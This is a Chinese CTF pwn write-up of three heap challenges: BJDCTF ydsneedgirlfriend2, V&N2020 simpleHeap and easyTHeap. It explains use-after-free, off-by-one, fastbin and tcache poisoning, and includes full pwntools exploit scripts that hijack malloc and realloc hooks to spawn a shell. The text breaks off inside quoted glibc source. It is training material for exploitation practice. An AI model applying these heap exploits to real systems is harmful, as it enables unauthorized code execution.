<h2 id="BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><a href="#BJDCTF-2nd-ydsneedgirlfriend2-overwrite" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite"></a>[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</h2><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/01/mDEwn7F62VP9klh.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/AbWlLCKU6Sdxn5D.png" alt="image.png"></p>
<p>看起来是一道堆题，存在分配、释放、打印堆块的功能</p>
<p>同时我们可以发现程序中存在后门函数</p>
<p><img src="https://i.loli.net/2020/12/01/Ym2n6FaAwBNOuV7.png" alt="image.png"></p>
<p>题目提示是Ubuntu18，也就是libc2.27，引入了tcache机制，但是没有tcache double free验证的版本</p>
<p>add函数中似乎只能分配7个堆块，空间有点紧张，而且每次分配后都会覆盖掉原来的堆块指针</p>
<p><img src="https://i.loli.net/2020/12/01/E5oFjm9cVOnTGXv.png" alt="image.png"></p>
<p>好在free后未将指针置0，<strong>存在Use After Free</strong>漏洞</p>
<p><img src="https://i.loli.net/2020/12/01/yDu6BFCNoMLItQd.png" alt="image.png"></p>
<p>同时我们可以发现<code>show()</code>函数中调用的是girlfriend[0][1]中的数据作为函数指针来执行，而<strong>girlfriend</strong>本身就是一个指针，在初始时分配的是0x10大小的堆块</p>
<p><img src="https://i.loli.net/2020/12/01/Tk48oH5yF7NPvrp.png" alt="image.png"></p>
<p>故我们只需要初始化girlfriend后free掉girlfriend再重新分配一个0x10大小的堆块即可改写该指针为后门函数地址后再show即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./girlfriend&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,27506)</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;u choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the length of her name:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please tell me her name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(backdoor))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/12/01/QHNE6DmMORUiGcF.png" alt="image.png"></p>
<h1 id="V-amp-N2020-公开赛-Pwn"><a href="#V-amp-N2020-公开赛-Pwn" class="headerlink" title="V&amp;N2020 公开赛 - Pwn"></a>V&amp;N2020 公开赛 - Pwn</h1><h2 id="V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget"></a>[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget</h2><p>又是一道堆题来了，不出所料，保  护  全  开</p>
<p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p>
<p>同时题目提示Ubuntu16，也就是说没有tcache</p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p>
<p>这是一道有着分配、打印、释放、编辑堆块的功能的堆题，不难看出我们只能分配10个堆块，不过没有tcache的情况下，空间其实还是挺充足的                                                                                                                   </p>
<p>漏洞点在edit函数中，<strong>会多读入一个字节，存在off by one漏洞</strong>，利用这个漏洞我们可以<strong>修改一个堆块的物理相邻的下一个堆块的size</strong></p>
<p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p>
<p>由于题目本身仅允许分配大小小于111的chunk，而进入unsorted bin需要malloc(0x80)的chunk，故我们还是考虑利用off by one的漏洞改大一个chunk的size送入unsorted bin后分割造成overlapping的方式获得libc的地址</p>
<p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p>
<p>因为刚好fastbin attack所用的chunk的size为0x71，故我们将这个大chunk的size改为<code> 0x70 + 0x70 + 1 = 0xe1</code>即可</p>
<p>传统思路是将__malloc_hook改为one_gadget以getshell，但是直接尝试我们会发现根本无法getshell</p>
<p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p>
<p>这是因为one_gadget并非任何时候都是通用的，都有一定的先决条件，而当前的环境刚好不满足one_gadget的环境</p>
<p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p>
<p>那么这里我们可以尝试使用realloc函数中的gadget来进行压栈等操作来满足one_gadget的要求，该段gadget执行完毕后会跳转至__realloc_hook（若不为NULL）</p>
<p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p>
<p>而__realloc_hook和__malloc_hook刚好是挨着的，我们在fastbin attack时可以一并修改</p>
<p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p>
<p>故考虑修改__malloc_hook跳转至realloc函数开头的gadget调整堆栈，修改__realloc_hook为one_gadget即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\xe1&#x27;</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">&quot;libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p>
<blockquote>
<p>不得不说V&amp;N出的题质量还是可以的，虽然说可能对大佬们来说只是一道简单题，但这确实让我这个大一的萌新受益匪浅XD</p>
</blockquote>
<h2 id="V-amp-N2020-公开赛-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><a href="#V-amp-N2020-公开赛-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget"></a>[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</h2><blockquote>
<p>不愧是VN的题…又让笔者这个蒟蒻pwner学到了一种新的攻击手法…</p>
</blockquote>
<p>惯例的<code>checksec</code>，保护全开，不出意外又是一道堆题<del>看名字也知道是一道堆题</del></p>
<p><img src="https://i.loli.net/2021/01/25/3ApsgBYDW1kPvZq.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/25/VvSMXr1gkjswG8F.png"></p>
<p>程序本身有着<strong>分配、编辑、打印、释放</strong>堆块的功能，算是功能比较齐全</p>
<p>但是程序本身限制了<strong>只能分配7次堆块，只能释放3次堆块</strong></p>
<p><img src="https://i.loli.net/2021/01/25/bh3nFx1AWiQLIpy.png"></p>
<p>漏洞点在于free功能中<strong>没有将堆块指针置NULL，存在Use After Free漏洞</strong></p>
<p><img src="https://i.loli.net/2021/01/25/qnHTGlJfv78uzCU.png"></p>
<p>虽然说在分配堆块的功能中并没有过于限制大小（0x100），但是题目所给的libc是有着tcache的2.27版本，需要通过unsorted bin泄露main_arena的地址我们至少需要释放8次堆块才能获得一个unsorted chunk，而我们仅被允许释放3次堆块</p>
<p>但是利用use after free我们是可以泄露堆基址的，而<strong>用以管理tcache的tcache_perthread_struct结构体本身便是由一个chunk实现的</strong></p>
<blockquote>
<p>以下代码来自glibc2.27</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">mstate ar_ptr;</span><br><span class="line"><span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">   victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>我们不难看出tcache结构本身便是通过一个chunk来实现的</p>
</blockquote>
<p>libc2.27中没有对tcache double free的检查，故在这里我们可以<strong>通过tcache double free结合use after free泄漏出堆基址后伪造一个位于tcache_perthread_struct结构体附近的fake chunk以劫持tcache_perthread_struct结构体修改tcache_perthread_struct-&gt;counts中对应index的值为7后释放chunk便可以获得unsorted bin以泄露libc基址</strong></p>
<p>惯例的pwndbg动态调试，我们可以得到tcache结构体的size，也就得到了偏移</p>
<p><img src="https://i.loli.net/2021/01/25/ceBImgTw97HbUxh.png"></p>
<blockquote>
<p>libc2.31下这个size为0x291，不要像我一样犯了调错libc的错误❌</p>
</blockquote>
<p>需要注意的是在free功能中会将其保存的chunk size置0， 因而我们需要<strong>重新将这个chunk申请回来后才能继续编辑</strong></p>
<blockquote>
<p>菜鸡a3の踩坑点 * 1</p>
</blockquote>
<h3 id="解法一：劫持-malloc-hook"><a href="#解法一：劫持-malloc-hook" class="headerlink" title="解法一：劫持__malloc_hook"></a>解法一：劫持__malloc_hook</h3><p>比较老生常谈的做法了，<strong>因为我们已经获得了对tcache结构体的控制权所以可以直接修改指针为__malloc_hook后改为one_gadget后分配任一chunk即可get shell</strong>，这种做法刚好用满7次分配</p>
<p>由于one_gadget对栈上值有要求，故在这里选择构造fake chunk到__realloc_hook旁，通过realloc中的gadget调整栈帧后再跳转到one_gadget</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28658)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x260</span></span><br><span class="line">    log.info(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx4, our fake chunk</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x07&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x07&quot;</span>)) <span class="comment"># all full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x10&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) * <span class="number">21</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line">    edit(<span class="number">5</span>, p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    new(<span class="number">0x100</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/25/qg1viECIkjpyoOw.png"></p>
<blockquote>
<p>p64(0) * 21的偏移也是我手动调出来的…当然那些熟读libc源码的大佬基本都能直接🧠算（</p>
<p><img src="https://i.loli.net/2021/01/25/ZNfxWqLCTlsMcoi.png"></p>
</blockquote>
<h3 id="解法二：攻击stdout劫持vtable表"><a href="#解法二：攻击stdout劫持vtable表" class="headerlink" title="解法二：攻击stdout劫持vtable表"></a>解法二：攻击stdout劫持vtable表</h3><blockquote>
<p>在ha1vk师傅的博客看到的解法…这个思路我个人觉得很巧妙…反正是学到了新东西…</p>
</blockquote>
<p>除了劫持__malloc_hook为one_gadget之外，我们也可以通过劫持_IO_2_1_stdout_中的vtable表的方式调用one_gadget</p>
<p>观察到程序中在我们edit之后会调用puts()函数</p>
<p><img src="https://i.loli.net/2021/01/28/NlbrxUYMTpaohFj.png"></p>
<p>puts()函数定义于libio&#x2F;ioputs.c中，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span 